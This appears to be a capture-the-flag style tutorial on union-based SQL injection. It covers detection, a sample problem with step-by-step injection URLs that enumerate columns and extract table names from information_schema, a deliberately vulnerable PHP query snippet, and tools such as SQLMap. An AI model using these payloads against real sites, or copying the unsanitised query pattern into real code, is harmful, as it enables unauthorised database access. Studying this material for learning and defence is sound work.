# SQL Injection: Union-Based SQL Injection

## Introduction

Union-Based SQL Injection is a type of SQL injection attack that leverages the SQL UNION operator to combine the results of two or more SELECT queries into a single result set. This method can be used by attackers to extract data from a database by adding their own queries to the original query, which the application executes.

## Table of Contents

- [SQL Injection: Union-Based SQL Injection](#sql-injection-union-based-sql-injection)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [How to identify](#how-to-identify)
  - [Code/tools/websites](#codetoolswebsites)
    - [Code Snippets](#code-snippets)
    - [Tools](#tools)
    - [Websites](#websites)
  - [Sample problem](#sample-problem)
    - [Problem Statement](#problem-statement)
    - [Solution](#solution)
  - [References](#references)
  - [Conclusion](#conclusion)

## How to identify

To identify Union-Based SQL Injection vulnerabilities, look for inputs that are used directly in SQL queries without proper sanitization. Typical indicators include:

1. **Unexpected Behavior:** When inputting SQL syntax (like single quotes, double quotes, or UNION SELECT statements) causes unusual behavior in the application.
2. **Manual Testing:** Try injecting `UNION SELECT NULL` and incrementally increase the number of `NULL` values until the number of columns matches the original query.


```sql
http://somewebsite.com/products.php?id=1 UNION SELECT NULL,NULL
```
3. Sometimes you might be given the soruce code of the website with php in it. Here is an example of a vulnerable PHP code snippet:
   
```php
<?php
$id = $_GET['id'];
$query = "SELECT name, price FROM products WHERE id = '$id'";
$result = mysqli_query($conn, $query);
?>
```

## Code/tools/websites
### Code Snippets
The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

```SQL
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

We can use this to add addtional queries to the one sent from the website.





### Tools
- **SQLMap:** An automated tool for SQL injection and database takeover.
- **Burp Suite:** A web vulnerability scanner with tools for manual testing.
- **Havij:** An automated SQL injection tool.

### Websites
> [Zixem](https://www.zixem.altervista.org/SQLi/)
>
> TBA...


## Sample problem

### Problem Statement
You are given access to a web application with a product search feature. The URL for searching products is:
```plaintext
http://example.com/search.php?query=laptop
```
The taks is to identify if the application is vulnerable to Union-Based SQL Injection and extract the names of all tables in the database.

### Solution
1. Test for SQL injection vulnerability:
   ```SQL
   http://example.com/search.php?query=laptop' UNION SELECT NULL,NULL--
   ```
   If you receive an error or abnormal behavior, the site might be vulnerable.

2. Determine the number of columns:
   ```SQL
   http://example.com/search.php?query=laptop' UNION SELECT NULL,NULL,NULL--
   ```
   Adjust the number of `NULL` values until you get a valid response.

3. Extract table names:
   ```SQL
   http://example.com/search.php?query=laptop' UNION SELECT table_name,NULL FROM information_schema.tables--
   ```

> Note: Zixen website has some great problems on this topic, consider doing them to hone your skill :) 

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/union-attacks)
- [SQLMap Documentation](https://sqlmap.org/)

## Conclusion

Union-Based SQL Injection is a powerful technique for extracting data from vulnerable applications. Identifying such vulnerabilities requires understanding the behavior of SQL queries and using appropriate tools and manual testing methods. By practicing with tools like SQLMap and platforms like PortSwigger Web Security Academy, you can enhance your skills in exploiting and securing web applications against SQL injection attacks.